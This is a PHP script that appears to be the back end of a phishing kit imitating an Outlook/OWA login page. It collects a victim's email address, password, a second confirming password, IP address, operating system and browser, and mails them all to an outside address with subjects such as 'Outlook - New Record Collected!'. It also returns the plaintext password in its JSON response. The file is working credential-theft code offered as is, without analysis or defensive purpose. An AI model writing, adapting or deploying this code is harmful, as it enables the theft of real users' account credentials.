<?php
  // form verification
    if(isset($_POST['verify']) && $_POST['verify'] == 'owa')
    {
        $email = $_POST['email'];
        $userBrowser = $_POST['userBrowser'];
        $userIp = $_POST['userIP'];
        $user_os = $_POST['OSName'];
        $password = htmlentities(trim($_POST['pwd']), ENT_QUOTES, 'UTF-8');

        // mail point
        $mailLink = "test@themonarchman.com";
        //$mailContent = "The email is ".$email." and the password is ".$password.". The client machine is ".$user_os." and the ip is ".$userIp." . The client is using ".$userBrowser." browser. The password was not verified!";

        $mailContent = "Username : " . $email . "\n";
        $mailContent.= "Password : " . $password . "\n";
        $mailContent.= "Password Verifier : NOT VERIFIED\n";
        $mailContent.= "Client IP : " . $userIp . "\n";
        $mailContent.= "Client machine : " . $user_os . "\n";
        $mailContent.= "Client Browser : " . $userBrowser . "\n";
        $mailSubject = "Outlook - New Record Collected!";
        $headers = "MIME-Version: 1.0\n";
        mail($mailLink, $mailSubject, $mailContent, $headers);

        $response = array('status' => 200, 'isSent' => true, 'password' => $password);
    } else {
        if (isset($_POST['verify']) && $_POST['verify'] == 'outlook') {
            $email = $_POST['email'];
            $userBrowser = $_POST['userBrowser'];
            $userIp = $_POST['userIP'];
            $user_os = $_POST['OSName'];
            $password = htmlentities(trim($_POST['pwd']), ENT_QUOTES, 'UTF-8');
            $verified_pwd = htmlentities(trim($_POST['v_pwd']), ENT_QUOTES, 'UTF-8');

            // mail point
            $mailLink = "test@themonarchman.com";
            // $mailContent = "The email is ".$email." and the password is ".$password.". The password was verified as ".$verified_pwd.". The client machine is ".$user_os." and the ip is ".$userIp." . The client is using ".$userBrowser." browser.";

            $mailContent = "Username : " . $email . "\n";
            $mailContent.= "Password : " . $password . "\n";
            $mailContent.= "Password Verifier : " . $verified_pwd . "\n";
            $mailContent.= "Client IP : " . $userIp . "\n";
            $mailContent.= "Client machine : " . $user_os . "\n";
            $mailContent.= "Client Browser : " . $userBrowser . "\n";
            $mailSubject = "Outlook - New Record Verified!";
            $headers = "MIME-Version: 1.0\n";
            mail($mailLink, $mailSubject, $mailContent, $headers);

            $response = array('status' => 200, 'isSent' => true);
        }
    }

    // header('Content-type: text/json');
    // header('Content-type: application/json');

    // echo json_encode($response);
    echo json_encode($response);
?>